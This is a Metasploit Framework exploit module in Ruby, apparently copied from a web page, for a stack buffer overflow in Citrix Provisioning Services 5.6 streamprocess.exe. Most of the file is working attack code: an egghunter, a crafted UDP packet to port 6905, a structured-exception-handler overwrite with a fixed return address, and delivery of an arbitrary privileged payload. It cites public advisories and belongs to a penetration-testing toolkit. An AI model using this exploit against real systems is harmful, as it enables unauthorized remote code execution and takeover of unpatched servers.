# $Id: citrix_streamprocess.rb 13042 2011-06-27 18:00:12Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::Remote::Udp
    include Msf::Exploit::Remote::Egghunter
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Citrix Provisioning Services 5.6 streamprocess.exe Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack buffer overflow in Citrix Provisioning Services 5.6.
                By sending a specially crafted packet to the Provisioning Services server, a fixed
                length buffer on the stack can be overflowed and arbitrary code can be executed.
            },
            &#039;Author&#039;         => &#039;mog&#039;,
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 13042 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;OSVDB&#039;, &#039;70597&#039;],
                    [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-11-023/&#039; ],
                    [ &#039;URL&#039;, &#039;http://secunia.com/advisories/42954/&#039; ],
                    [ &#039;URL&#039;, &#039;http://support.citrix.com/article/CTX127149&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00", # Only "\x00\x00" breaks the overflow, but this is safer
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    # pop/pop/ret in streamprocess.exe
                    # Service runs and automatically shuts down in Win 7
                    [ &#039;Windows XP SP3 / Windows Server 2003 SP2 / Windows Vista&#039;, { &#039;Ret&#039; => 0x00423d32 } ],
                ],
            &#039;Privileged&#039;     => true,
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Jan 20 2011&#039;))
 
        register_options([Opt::RPORT(6905)], self.class)
    end
 
    def exploit
 
        eggoptions =
        {
            :checksum  => true,
            :eggtag    => &#039;W00t&#039;,
        }
        hunter,egg = generate_egghunter(payload.encoded, payload_badchars, eggoptions)
 
        sploit = "\x10\x00\x02\x40"  # message type
        sploit << rand_text_alpha_upper(30)
        sploit << "\x00\x01\x00\x00" # length field
        sploit << rand_text_alpha_upper(400)
        sploit << hunter
        sploit << rand_text_alpha_upper(64 - hunter.length)
 
        sploit << "\xEB\xBE"                # Jump back 66 bytes to hunter because there&#039;s
        sploit << rand_text_alpha_upper(2)  # only 24 bytes of cyclic copy after ret
        sploit << [target.ret].pack(&#039;V&#039;)    # SE handler
 
        sploit << rand_text_alpha_upper(50) # Need >= 24 bytes to keep the tag out of the stack
        sploit << egg                       # Payload has a whole page to itself
 
        print_status("Trying target #{target.name}...")
 
        connect_udp
        udp_sock.put(sploit)
        print_status("Exploit sent, wait for egghunter.")
        select(nil, nil, nil, 4) # takes about 8 seconds in tests
 
        handler(udp_sock)
        disconnect_udp
    end
 
end



